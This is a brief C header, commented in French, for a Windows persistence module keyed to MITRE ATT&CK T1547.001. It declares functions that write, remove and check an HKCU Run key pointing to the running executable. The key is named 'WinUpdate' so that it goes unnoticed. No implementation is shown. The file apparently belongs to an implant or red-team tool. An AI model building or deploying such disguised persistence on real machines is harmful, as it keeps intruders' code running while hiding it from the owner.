/*
 * persist.h — Persistance via Registry Run Key (HKCU)
 *
 * MITRE ATT&CK : T1547.001 — Registry Run Keys / Startup Folder
 */

#ifndef PERSIST_H
#define PERSIST_H

/* Valeur de registre utilisee (nom generique pour passer inapercu) */
#define PERSIST_VALUE_NAME "WinUpdate"

/*
 * Installe la persistance :
 *   HKCU\Software\Microsoft\Windows\CurrentVersion\Run
 *   "WinUpdate" = chemin de l'exe courant (GetModuleFileNameA)
 * Idempotent : la valeur est reecrite a chaque appel, sans doublon.
 * Retourne 0 si succes, -1 sinon.
 */
int persist_install(void);

/*
 * Supprime la valeur de persistance.
 * Retourne 0 si succes (ou valeur absente), -1 si erreur.
 */
int persist_remove(void);

/*
 * Verifie si la persistance est installee.
 * Retourne 1 si presente, 0 sinon.
 */
int persist_is_installed(void);

#endif /* PERSIST_H */
